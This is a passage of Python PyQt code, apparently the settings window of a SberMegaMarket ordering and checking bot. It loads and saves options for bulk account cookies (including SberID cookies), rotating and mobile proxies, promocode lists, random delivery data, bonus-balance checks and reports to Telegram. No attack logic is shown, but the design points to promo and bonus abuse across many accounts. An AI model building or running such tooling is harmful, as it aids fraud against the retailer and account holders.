            use_check_grev = data['use_check_grev']
            use_on_sber_spas = data['use_on_sber_spas']

        self.use_change_poluchatel_from_link_box.setChecked(self.str_to_bool(use_change_poluchatel_from_link))
        self.use_promocode_from_lk_box.setChecked(self.str_to_bool(use_promocode_from_lk))
        self.use_txt_adres_deliv_box.setChecked(self.str_to_bool(use_txt_adres_deliv))
        self.use_mobile_proxy_box.setChecked(self.str_to_bool(use_mobile_proxy))
        self.use_random_data_for_deliv.setChecked(self.str_to_bool(use_random_data_for_deliv))
        self.use_cookies_with_sberID_box.setChecked(self.str_to_bool(use_cookies_with_sber_id))
        self.use_random_adres_box.setChecked(self.str_to_bool(use_random_adres))
        self.use_txt_promocode_box.setChecked(self.str_to_bool(use_txt_promocode))
        self.use_check_bonus_value_box.setChecked(self.str_to_bool(use_check_bonus_value))
        self.use_txt_proxy_box.setChecked(self.str_to_bool(use_txt_proxy))
        self.use_txt_comment_box.setChecked(self.str_to_bool(use_txt_comment))
        self.use_clear_bag_box.setChecked(self.str_to_bool(use_clear_bag))
        self.use_check_grev_box.setChecked(self.str_to_bool(use_check_grev))
        self.use_on_sber_spas_box.setChecked(self.str_to_bool(use_on_sber_spas))
        self.input_fixed_promocode.setText(fixed_promocode)
        self.input_telegram_api.setText(telegram_api)
        self.input_phone_for_pay.setText(pay_phone)
        self.input_phone_for_deliv.setText(deliv_phone)
        self.input_first_name_for_deliv.setText(deliv_first_name)
        self.input_last_name_for_deliv.setText(deliv_last_name)
        self.input_adres_deliv.setText(adres_deliv)
        self.input_adres_deliv.setText(adres_deliv)
        self.input_entrance_deliv.setText(adres_entrance)
        self.input_floor_deliv.setText(adres_floor)
        self.input_block_deliv.setText(adres_block)
        self.input_domofon_deliv.setText(adres_domofon)
        self.input_check_promocode_price.setText(check_promocode_price)
        self.input_pool_value.setText(pool_value)
        self.cookies_way.setText(cookies_way)
        self.cookies_in_run_way.setText(cookies_in_run_way)
        self.cookies_nvalid_way.setText(cookies_nvalid_way)
        self.cookies_uses_way.setText(cookies_uses_way)
        self.cookies_dont_grev_way.setText(cookies_dont_grev_way)
        self.cookies_dont_change_way.setText(cookies_dont_change_way)
        self.txt_promocode_way.setText(txt_promocode_way)
        self.txt_promocode_uses_way.setText(txt_promocode_uses_way)
        self.txt_promocode_nvalid_way.setText(txt_promocode_nvalid_way)
        self.txt_cooment_way.setText(txt_comments_way)
        self.txt_proxy_way.setText(txt_proxy_way)
        self.txt_usue_proxy_way.setText(txt_uses_proxy_way)
        self.txt_adres_way.setText(txt_adres_way)
        self.input_mobile_proxy.setText(mobile_proxy)
        self.input_link_change_mobile_proxy.setText(link_change_mobile_proxy)


class smm_auto_check(QtWidgets.QMainWindow, ui_files.chekerUI.Ui_Dialog):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.setWindowIcon(QIcon('icon.png'))

        # >>> Коннекты кнопок
        self.start_checker_btn.clicked.connect(self.start_smm_auto_check)  # Запуск программы
        self.cookies_way_btn.clicked.connect(self.change_way_cookies)  # Путь до куков
        self.save_setting_btn.clicked.connect(self.save_settings)
        self.way_to_txt_proxy_btn.clicked.connect(self.change_proxy_txt_way)
        self.cookies_uses_way_btn.clicked.connect(self.change_way_uses_cookies)
        self.way_to_uses_txt_proxy_btn.clicked.connect(self.change_uses_proxy_txt_way)
        if os.path.exists(f'{path_to_dir}/mainData/smm_auto_check_settings.json') == True:
            self.auto_fill()
        else:
            pass

    # >>> Run program
    def start_smm_auto_check(self):  # Запуск программы
        self.thred_start()

    def thred_start(self):
        print('sad')
        th = threading.Thread(target=checker_start.Pool, args=(user_n, ))
        th.start()

    # >>> Cookies way
    def change_way_cookies(self):  # Путь до куков
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.txt_cookies_way.setText(cookies_way)

    def change_way_uses_cookies(self):
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.txt_uses_cookies_way.setText(cookies_way)

    def change_proxy_txt_way(self):
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать файл", options=options)
        txt_way = way[0]
        if txt_way:
            self.txt_proxy_way.setText(txt_way)

    def change_uses_proxy_txt_way(self):
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать файл", options=options)
        txt_way = way[0]
        if txt_way:
            self.txt_usue_proxy_way.setText(txt_way)

    # >>> Save settings
    def save_settings(self):
        try:
            print('[Настройки сохранены]')

            # Inputs data
            pool_value = self.input_pool_value.text()  # Количество потоков
            telegram_api = self.input_telegram_api.text()  # Telegram API token
            mobile_proxy = self.input_mobile_proxy.text()
            link_change_mobile_proxy = self.input_link_change_mobile_proxy.text()

            # Settings for check
            check_promocode = self.check_promocode_box.isChecked()  # Проверять промокоды
            check_status_order = self.check_status_order_box.isChecked()  # Проверять статусы заказов
            check_sber_bonus = self.check_sber_bonus_box.isChecked()  # Проверять бонусы сбер спасибо

            # Other settings
            use_send_data_telegram = self.send_data_telegram_box.isChecked()  # Использовать отправку данных в телеграм бота
            use_txt_proxy = self.use_txt_proxy_box.isChecked()  # Использовать прокси из txt
            use_sber_id_cookies = self.use_cookies_with_sberID_box.isChecked()  # Использовать куков со sberID
            use_mobile_proxy = self.use_mobile_proxy_box.isChecked()

            # >>> Ways to files
            txt_proxy_way = self.txt_proxy_way.text()  # Путь к прокси
            txt_uses_proxy_way = self.txt_usue_proxy_way.text()  # Путь к использованным прокси
            cookies_uses_way = self.txt_uses_cookies_way.text()  # Путь к использованными cookies
            cookies_way = self.txt_cookies_way.text()  # Путь до куков

            # >>> Write to json
            to_json = {'pool_value': f'{pool_value}',
                       'telegram_api': f'{telegram_api}',
                       'cookies_way': f'{cookies_way}',
                       'mobile_proxy': f'{mobile_proxy}',
                       'link_change_mobile_proxy': f'{link_change_mobile_proxy}',
                       'txt_uses_proxy_way': f'{txt_uses_proxy_way}',
                       'cookies_uses_way': f'{cookies_uses_way}',
                       'use_mobile_proxy': f'{use_mobile_proxy}',
                       'use_sber_id_cookies': f'{use_sber_id_cookies}',
                       'use_txt_proxy': f'{use_txt_proxy}',
                       'use_send_data_telegram': f'{use_send_data_telegram}',
                       'txt_proxy_way': f'{txt_proxy_way}',
                       'check_promocode': f'{check_promocode}',
                       'check_status_order': f'{check_status_order}',
                       'check_sber_bonus': f'{check_sber_bonus}'}
            with open(f'{path_to_dir}/mainData/smm_auto_check_settings.json', 'w', encoding='utf-8') as f:
                json.dump(to_json, f, indent=4)

            auth.message_window('Настройки успешно сохранены')
        except Exception as ex:
            print(ex)

    def str_to_bool(self, data):
        if data == 'True':
            return True
        else:
            return False

    # >>> AutoFill settings
    def auto_fill(self):
        with open(f'{path_to_dir}/mainData/smm_auto_check_settings.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            pool_value = data['pool_value']
            cookies_way = data['cookies_way']
            txt_uses_proxy_way = data['txt_uses_proxy_way']
            cookies_uses_way = data['cookies_uses_way']
            txt_proxy_way = data['txt_proxy_way']
            telegram_api = data['telegram_api']
            mobile_proxy = data['mobile_proxy']
            link_change_mobile_proxy = data['link_change_mobile_proxy']
            use_mobile_proxy = data['use_mobile_proxy']
            use_sber_id_cookies = data['use_sber_id_cookies']
            use_txt_proxy = data['use_txt_proxy']
            use_send_data_telegram = data['use_send_data_telegram']
            check_promocode = data['check_promocode']
            check_status_order = data['check_status_order']
            check_sber_bonus = data['check_sber_bonus']

        self.use_txt_proxy_box.setChecked(self.str_to_bool(use_txt_proxy))
        self.use_mobile_proxy_box.setChecked(self.str_to_bool(use_mobile_proxy))
        self.use_cookies_with_sberID_box.setChecked(self.str_to_bool(use_sber_id_cookies))
        self.send_data_telegram_box.setChecked(self.str_to_bool(use_send_data_telegram))
        self.check_promocode_box.setChecked(self.str_to_bool(check_promocode))
        self.check_status_order_box.setChecked(self.str_to_bool(check_status_order))
        self.check_sber_bonus_box.setChecked(self.str_to_bool(check_sber_bonus))
        self.input_pool_value.setText(pool_value)
        self.txt_cookies_way.setText(cookies_way)
        self.txt_uses_cookies_way.setText(cookies_uses_way)
        self.txt_proxy_way.setText(txt_proxy_way)
        self.txt_usue_proxy_way.setText(txt_uses_proxy_way)
        self.input_telegram_api.setText(telegram_api)
        self.input_mobile_proxy.setText(mobile_proxy)
        self.input_link_change_mobile_proxy.setText(link_change_mobile_proxy)


def main():
    app = QtWidgets.QApplication(sys.argv)
    window = auth()
    window.show()
    app.exec_()


if __name__ == "__main__":
    main()
